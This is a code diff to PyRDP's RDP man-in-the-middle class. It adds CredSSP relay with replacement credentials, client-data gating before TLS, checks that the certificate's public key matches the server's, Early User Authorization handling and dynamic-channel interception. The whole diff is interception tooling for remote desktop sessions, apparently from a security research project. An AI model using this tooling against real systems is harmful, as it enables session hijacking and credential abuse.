@@ -6,6 +6,10 @@
 
 import asyncio
 import datetime
+import hashlib
+import os
+import struct
+import time
 import typing
 
 from twisted.internet import reactor
@@ -33,7 +37,7 @@ from pyrdp.mitm.PlayerLayerSet import TwistedPlayerLayerSet
 from pyrdp.mitm.SecurityMITM import SecurityMITM
 from pyrdp.mitm.SlowPathMITM import SlowPathMITM
 from pyrdp.mitm.TCPMITM import TCPMITM
-from pyrdp.mitm.VirtualChannelMITM import VirtualChannelMITM
+from pyrdp.mitm.VirtualChannelMITM import VirtualChannelMITM, DrdynvcMITM
 from pyrdp.mitm.X224MITM import X224MITM
 from pyrdp.mitm.config import MITMConfig
 from pyrdp.mitm.layerset import RDPLayerSet
@@ -122,6 +126,11 @@ class RDPMITM:
         self._credSSPDeferred = None
         """Tracks the CredSSP async coroutine deferred for cancellation on disconnect"""
 
+        self._tlsRetryCount = 0
+        """Counter for doClientTls retries when server cert is not yet available"""
+
+        self.state.connectionTimestamps["init"] = time.monotonic()
+
         self.client.x224.addObserver(X224Logger(self.getClientLog("x224")))
         self.client.mcs.addObserver(MCSLogger(self.getClientLog("mcs")))
         self.client.slowPath.addObserver(SlowPathLogger(self.getClientLog("slowpath")))
@@ -208,7 +217,13 @@ class RDPMITM:
         else:
             reactor.connectTCP(self.state.effectiveTargetHost, self.state.effectiveTargetPort, serverFactory)
 
-        await serverFactory.connected.wait()
+        try:
+            await asyncio.wait_for(serverFactory.connected.wait(), timeout=10.0)
+        except asyncio.TimeoutError:
+            self.log.error("Backend connection timed out (%(host)s:%(port)d)",
+                           {"host": self.state.effectiveTargetHost, "port": self.state.effectiveTargetPort})
+            self.client.tcp.disconnect()
+            return
 
         if self.config.attackerHost is not None and self.config.attackerPort is not None and not self.player.tcp.connectedEvent.is_set():
             attackerFactory = AwaitableClientFactory(self.player.tcp)
@@ -221,9 +236,14 @@ class RDPMITM:
                 self.log.error("Failed to connect to recording host: timeout expired")
 
     def doClientTls(self):
+        self.state.connectionTimestamps["tls_start"] = time.monotonic()
         cert = self.server.tcp.transport.getPeerCertificate()
         if not cert:
-            # Wait for server certificate
+            self._tlsRetryCount += 1
+            if self._tlsRetryCount > 5:
+                self.log.error("Server TLS certificate not available after 5 retries — disconnecting")
+                self.client.tcp.disconnect()
+                return
             reactor.callLater(1, self.doClientTls)
             return
 
@@ -245,6 +265,21 @@ class RDPMITM:
         except Exception:
             pass  # Don't let cert logging break the connection
 
+        # If the server selected CRED_SSP (relay path), auto-cloned certs
+        # will fail because CredSSP's pubKeyAuth binds to the TLS public key.
+        if self.state.credSspSelected:
+            if self.certs:
+                self.log.error(
+                    "CredSSP relay aborted: auto-cert-cloning produces a key pair that "
+                    "does not match the target server's TLS public key, so CredSSP's "
+                    "pubKeyAuth will fail. Provide -c/-k pointing at the server's actual "
+                    "certificate and private key."
+                )
+                self.client.tcp.disconnect()
+                return
+            if not self._verifyRelayCertMatchesServer(cert):
+                return
+
         # Clone certificate if necessary.
         if self.certs:
             privKey, certFile = self.certs.lookup(cert)
@@ -252,6 +287,24 @@ class RDPMITM:
         else:
             # No automated certificate cloning. Use the specified certificate.
             contextForClient = ServerTLSContext(self.config.privateKeyFileName, self.config.certificateFileName)
+
+        # When doing credential-relay CredSSP, gate client data BEFORE
+        # starting client TLS. The gate must be active before the client
+        # can send any post-TLS data (MCS Connect Initial, Channel Joins, etc.)
+        # Otherwise the async CredSSP coroutine starts too late and client
+        # data flows through ungated.
+        clientDataBuffer = None
+        originalSegRecv = None
+        if self.state.serverRequiresNLA and self.config.replacementUsername and self.config.replacementPassword:
+            clientDataBuffer = []
+            originalSegRecv = self.client.segmentation.recv
+            log = self.getLog("gate")
+            def bufferingRecv(data: bytes):
+                header = data[0] if data else 0
+                log.info("GATED segment: %(size)d bytes, first_byte=0x%(hdr)02x", {"size": len(data), "hdr": header})
+                clientDataBuffer.append(data)
+            self.client.segmentation.recv = bufferingRecv
+            self.log.debug("Client data gate set up BEFORE client TLS")
 
         # Establish TLS tunnel with the client
         self.onTlsReady()
@@ -262,10 +315,10 @@ class RDPMITM:
         ntlmSSPState = NTLMSSPState()
 
         if self.state.serverRequiresNLA and self.config.replacementUsername and self.config.replacementPassword:
-            # Server requires NLA and we have credentials — perform CredSSP ourselves
             self.log.info("Performing CredSSP authentication to server with replacement credentials.")
             from pyrdp.core import defer
-            self._credSSPDeferred = defer(self._performServerCredSSP())
+            self._credSSPDeferred = defer(self._performServerCredSSP(
+                preGatedBuffer=clientDataBuffer, preGatedRecv=originalSegRecv))
             return
 
         if self.state.ntlmCapture:
@@ -281,37 +334,112 @@ class RDPMITM:
         self.client.segmentation.addObserver(NLAHandler(self.server.tcp, ntlmSSPState, self.getLog("ntlmssp"), mitmState=self.state))
         self.server.segmentation.addObserver(NLAHandler(self.client.tcp, ntlmSSPState, self.getLog("ntlmssp"), mitmState=self.state))
 
-    async def _performServerCredSSP(self):
+    def _verifyRelayCertMatchesServer(self, serverCert) -> bool:
+        """Check that PyRDP's configured TLS certificate has the same public key
+        as the target server's TLS cert (required for CredSSP relay)."""
+        from OpenSSL import crypto
+        import hashlib
+
+        log = self.getLog("credssp-relay")
+        try:
+            serverPubKeyDer = crypto.dump_publickey(crypto.FILETYPE_ASN1, serverCert.get_pubkey())
+        except Exception as e:
+            log.error("Cannot read server TLS public key: %(error)s", {"error": str(e)})
+            self.client.tcp.disconnect()
+            return False
+
+        try:
+            with open(self.config.certificateFileName, "rb") as f:
+                pyrdpCert = crypto.load_certificate(crypto.FILETYPE_PEM, f.read())
+            pyrdpPubKeyDer = crypto.dump_publickey(crypto.FILETYPE_ASN1, pyrdpCert.get_pubkey())
+        except Exception as e:
+            log.error("Cannot read TLS public key from %(path)s: %(error)s",
+                      {"path": self.config.certificateFileName, "error": str(e)})
+            self.client.tcp.disconnect()
+            return False
+
+        if serverPubKeyDer == pyrdpPubKeyDer:
+            log.info("TLS public key matches the target server's. CredSSP relay can proceed.")
+            return True
+
+        log.error("CredSSP relay aborted: TLS public key does not match the target server's.")
+        log.error("  server pubkey sha256: %(fp)s",
+                  {"fp": hashlib.sha256(serverPubKeyDer).hexdigest()})
+        log.error("  pyrdp  pubkey sha256: %(fp)s",
+                  {"fp": hashlib.sha256(pyrdpPubKeyDer).hexdigest()})
+        self.client.tcp.disconnect()
+        return False
+
+    @staticmethod
+    def _extractSubjectPublicKey(cert) -> bytes:
+        """Extract the SubjectPublicKey from an X.509 certificate.
+        Properly parses the SubjectPublicKeyInfo ASN.1 structure instead of
+        using a hardcoded offset, so it works for any key type/size."""
+        from OpenSSL import crypto
+        pubkeyDer = crypto.dump_publickey(crypto.FILETYPE_ASN1, cert.get_pubkey())
+        # SubjectPublicKeyInfo is SEQUENCE { AlgorithmIdentifier, BIT STRING }
+        # The BIT STRING contains a leading 0x00 pad byte then the raw key.
+        # We parse the outer SEQUENCE to find the BIT STRING.
+        if pubkeyDer[0] != 0x30:
+            return pubkeyDer  # Fallback: return as-is
+        # Skip outer SEQUENCE tag+length
+        offset = 1
+        if pubkeyDer[offset] & 0x80:
+            lenBytes = pubkeyDer[offset] & 0x7F
+            offset += 1 + lenBytes
+        else:
+            offset += 1
+        # Skip AlgorithmIdentifier (SEQUENCE)
+        if pubkeyDer[offset] == 0x30:
+            offset += 1
+            if pubkeyDer[offset] & 0x80:
+                lenBytes = pubkeyDer[offset] & 0x7F
+                algLen = int.from_bytes(pubkeyDer[offset + 1:offset + 1 + lenBytes], 'big')
+                offset += 1 + lenBytes + algLen
+            else:
+                algLen = pubkeyDer[offset]
+                offset += 1 + algLen
+        # Now at BIT STRING (tag 0x03)
+        if pubkeyDer[offset] == 0x03:
+            offset += 1
+            if pubkeyDer[offset] & 0x80:
+                lenBytes = pubkeyDer[offset] & 0x7F
+                offset += 1 + lenBytes
+            else:
+                offset += 1
+            offset += 1  # Skip the 0x00 pad byte of BIT STRING
+            return pubkeyDer[offset:]
+        # Fallback for unexpected structure
+        return pubkeyDer
+
+    async def _performServerCredSSP(self, preGatedBuffer=None, preGatedRecv=None):
         """
         Perform CredSSP authentication to the server using replacement credentials.
         This is called when the server requires NLA and we have -u/-p configured.
         After CredSSP succeeds, the server-side connection is ready for normal RDP.
         The client side gets a TLS-only response (no NLA).
         """
-        import struct
         from OpenSSL import crypto
         from impacket import ntlm as impacket_ntlm
         from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp
         from Crypto.Cipher import ARC4
-        from pyrdp.security.credssp import buildTSRequest, buildTSCredentials
+        from pyrdp.security.credssp import buildTSRequest, buildTSCredentials, parseTSRequestVersion
 
         log = self.getLog("credssp")
         username = self.config.replacementUsername
         password = self.config.replacementPassword
-        # Use domain from config or empty string
         domain = ""
 
-        # Gate client data during CredSSP to prevent MCS data from being forwarded
-        # to the server before CredSSP completes. The client (told TLS-only) will send
-        # MCS Connect Initial as soon as TLS is up, which races with our CredSSP exchange.
-        # We intercept at the segmentation layer so TPKT/FastPath data is buffered.
-        clientDataBuffer = []
-        originalSegRecv = self.client.segmentation.recv
+        # Use the pre-gated buffer from doClientTls (gate was set up BEFORE
+        # client TLS started, so ALL post-TLS client data is captured).
+        clientDataBuffer = preGatedBuffer if preGatedBuffer is not None else []
+        originalSegRecv = preGatedRecv if preGatedRecv is not None else self.client.segmentation.recv
 
-        def bufferingRecv(data: bytes):
-            clientDataBuffer.append(data)
+        if preGatedBuffer is None:
+            def bufferingRecv(data: bytes):
+                clientDataBuffer.append(data)
+            self.client.segmentation.recv = bufferingRecv
 
-        self.client.segmentation.recv = bufferingRecv
         log.debug("Client data gated during CredSSP exchange")
 
         credSSPSucceeded = False
@@ -345,24 +473,25 @@ class RDPMITM:
                 self.client.tcp.disconnect()
                 return
 
-            certDer = crypto.dump_certificate(crypto.FILETYPE_ASN1, serverCert)
-            x509cert = crypto.load_certificate(crypto.FILETYPE_ASN1, certDer)
-            pkey = x509cert.get_pubkey()
-            dump = crypto.dump_publickey(crypto.FILETYPE_ASN1, pkey)
-            serverPubKey = dump[24:]  # Strip ASN.1 header to get raw SubjectPublicKey
+            serverPubKey = self._extractSubjectPublicKey(serverCert)
             log.info("Server TLS public key: %(size)d bytes", {"size": len(serverPubKey)})
 
-            # Step 1: Send NTLM NEGOTIATE
+            # Step 1: Send NTLM NEGOTIATE (advertise v6 — supports errorCode + SHA-256 binding)
             auth = impacket_ntlm.getNTLMSSPType1('', '', True, use_ntlmv2=True)
             blob = SPNEGO_NegTokenInit()
             blob['MechTypes'] = [NTLMSSP_OID]
             blob['MechToken'] = auth.getData()
-            tsReq1 = buildTSRequest(version=2, negoTokens=blob.getData())
+            tsReq1 = buildTSRequest(version=6, negoTokens=blob.getData())
             self.server.tcp.sendBytes(tsReq1)
-            log.debug("Sent CredSSP NEGOTIATE")
+            log.debug("Sent CredSSP NEGOTIATE (version=6)")
 
-            # Step 2: Receive CHALLENGE
+            # Step 2: Receive CHALLENGE and determine negotiated CredSSP version
             resp2 = await asyncio.wait_for(responseQueue.get(), timeout=10.0)
+            serverVersion = parseTSRequestVersion(resp2)
+            # Effective version = min(ours, server's)
+            credsspVersion = min(6, serverVersion)
+            log.info("CredSSP version negotiated: %(ver)d (server=%(sv)d)", {"ver": credsspVersion, "sv": serverVersion})
+
             # Find NTLMSSP in response
             ntlmIdx = resp2.find(b'NTLMSSP\x00')
             if ntlmIdx == -1:
@@ -374,8 +503,6 @@ class RDPMITM:
             # Extract NetBIOS domain from challenge TargetInfo
             from impacket.ntlm import NTLMAuthChallenge
             challengeMsg = NTLMAuthChallenge(rawChallenge)
-            targetInfo = challengeMsg['TargetInfoFields']
-            # Try to get NetBIOS domain
             try:
                 avPairs = impacket_ntlm.AV_PAIRS(challengeMsg['TargetInfoFields'])
                 if impacket_ntlm.NTLMSSP_AV_NB_DOMAIN_NAME in avPairs:
@@ -398,19 +525,33 @@ class RDPMITM:
             cipher = ARC4.new(clientSealingKey)
             clientSealingHandle = cipher.encrypt
 
-            # Encrypt server public key
+            # Build pubKeyAuth — version-dependent channel binding
+            clientNonce = None
+            if credsspVersion >= 5:
+                # v5+: SHA-256 hash binding with client nonce (CVE-2018-0886 fix)
+                clientNonce = os.urandom(32)
+                magic = b"CredSSP Client-To-Server Binding Hash\x00"
+                hashInput = magic + clientNonce + serverPubKey
+                pubKeyMessage = hashlib.sha256(hashInput).digest()
+                log.debug("Using CredSSP v5+ SHA-256 pubKeyAuth binding")
+            else:
+                # v2-4: raw encrypted public key
+                pubKeyMessage = serverPubKey
+                log.debug("Using CredSSP v2 raw pubKeyAuth binding")
+
             sealedPubKey, signature = impacket_ntlm.SEAL(
                 flags, clientSigningKey, clientSealingKey,
-                serverPubKey, serverPubKey, 0, clientSealingHandle
+                pubKeyMessage, pubKeyMessage, 0, clientSealingHandle
             )
 
             blob3 = SPNEGO_NegTokenResp()
             blob3['ResponseToken'] = type3.getData()
             pubKeyAuth = signature.getData() + sealedPubKey
 
-            tsReq3 = buildTSRequest(version=2, negoTokens=blob3.getData(), pubKeyAuth=pubKeyAuth)
+            tsReq3 = buildTSRequest(version=credsspVersion, negoTokens=blob3.getData(),
+                                    pubKeyAuth=pubKeyAuth, clientNonce=clientNonce)
             self.server.tcp.sendBytes(tsReq3)
-            log.debug("Sent CredSSP AUTHENTICATE + pubKeyAuth")
+            log.debug("Sent CredSSP AUTHENTICATE + pubKeyAuth (version=%(ver)d)", {"ver": credsspVersion})
 
             # Step 4: Receive pubKeyAuth confirmation
             resp4 = await asyncio.wait_for(responseQueue.get(), timeout=10.0)
@@ -427,30 +568,35 @@ class RDPMITM:
                 tsCreds, tsCreds, 1, clientSealingHandle
             )
             encCreds = credSig.getData() + sealedCreds
-            tsReq5 = buildTSRequest(version=2, authInfo=encCreds)
+            tsReq5 = buildTSRequest(version=credsspVersion, authInfo=encCreds)
             self.server.tcp.sendBytes(tsReq5)
             log.info("Sent encrypted credentials — CredSSP exchange complete!")
 
-            # CredSSP is done. The server is now ready for normal RDP (MCS etc.)
-            # The client side doesn't need NLA — it already got a TLS-only response.
-            # The normal MITM layers (TPKT, X224, MCS, etc.) are already wired and will
-            # handle data flowing between client and server.
-            log.info("CredSSP complete. Normal RDP MITM flow is now active.")
-
-            # Reset the ntlmCapture flag so any subsequent X224 handling works normally
-            self.state.ntlmCapture = False
-
-            # Brief delay to let the server finish processing TSCredentials and
-            # transition from CredSSP mode to RDP/TPKT mode. The client data gate
-            # is still active, so any client data arriving during this sleep is
-            # safely buffered and will be replayed after the gate is released.
+            # Step 6: Handle Early User Authorization Result (HYBRID_EX)
+            # If the client advertised PROTOCOL_HYBRID_EX and the server selected
+            # it, a 4-byte authorization result PDU arrives after CredSSP but
+            # before MCS. We must consume it (and optionally forward to client).
             try:
-                earlyResp = await asyncio.wait_for(responseQueue.get(), timeout=0.5)
-                if earlyResp[0] == 0x30:
+                earlyResp = await asyncio.wait_for(responseQueue.get(), timeout=1.0)
+                if len(earlyResp) == 4:
+                    # Early User Authorization Result PDU
+                    authResult = struct.unpack('<I', earlyResp)[0]
+                    if authResult == 0x00000000:
+                        log.info("Early User Authorization: SUCCESS")
+                    else:
+                        log.warning("Early User Authorization: DENIED (0x%(code)08x)", {"code": authResult})
+                        self.client.tcp.disconnect()
+                        return
+                elif earlyResp[0] == 0x30:
                     log.warning("Server sent TSRequest after TSCredentials (possible error)")
+                else:
+                    log.debug("Post-CredSSP data: %(size)d bytes", {"size": len(earlyResp)})
             except asyncio.TimeoutError:
-                pass  # Expected — server is ready for MCS
+                pass  # No Early User Auth — server is using HYBRID (not HYBRID_EX)
 
+            log.info("CredSSP complete (v%(ver)d). Normal RDP MITM flow is now active.", {"ver": credsspVersion})
+            log.debug("responseQueue has %(n)d pending items", {"n": responseQueue.qsize()})
+            self.state.ntlmCapture = False
             credSSPSucceeded = True
 
         except asyncio.TimeoutError:
@@ -504,6 +650,8 @@ class RDPMITM:
             self.buildClipboardChannel(client, server)
         elif self.state.channelMap[channelID] == MCSChannelName.DEVICE_REDIRECTION:
             self.buildDeviceChannel(client, server)
+        elif self.state.channelMap[channelID] == MCSChannelName.DYNAMIC_CHANNEL:
+            self.buildDynamicChannel(client, server)
         else:
             self.buildVirtualChannel(client, server)
 
@@ -633,6 +781,25 @@ class RDPMITM:
             LayerChainItem.chain(server, serverSecurity, serverLayer)
 
         mitm = VirtualChannelMITM(clientLayer, serverLayer, self.statCounter)
+        self.channelMITMs[client.channelID] = mitm
+
+    def buildDynamicChannel(self, client: MCSServerChannel, server: MCSClientChannel):
+        clientVirtualChannel = VirtualChannelLayer()
+        clientLayer = RawLayer()
+        serverVirtualChannel = VirtualChannelLayer()
+        serverLayer = RawLayer()
+
+        if self.state.useTLS:
+            LayerChainItem.chain(client, clientVirtualChannel, clientLayer)
+            LayerChainItem.chain(server, serverVirtualChannel, serverLayer)
+        else:
+            clientSecurity = self.state.createSecurityLayer(ParserMode.SERVER, True)
+            serverSecurity = self.state.createSecurityLayer(ParserMode.CLIENT, True)
+            LayerChainItem.chain(client, clientSecurity, clientVirtualChannel, clientLayer)
+            LayerChainItem.chain(server, serverSecurity, serverVirtualChannel, serverLayer)
+
+        mitm = DrdynvcMITM(clientLayer, serverLayer, self.statCounter, self.state,
+                           self.getLog(MCSChannelName.DYNAMIC_CHANNEL))
         self.channelMITMs[client.channelID] = mitm
 
     def sendPayload(self):
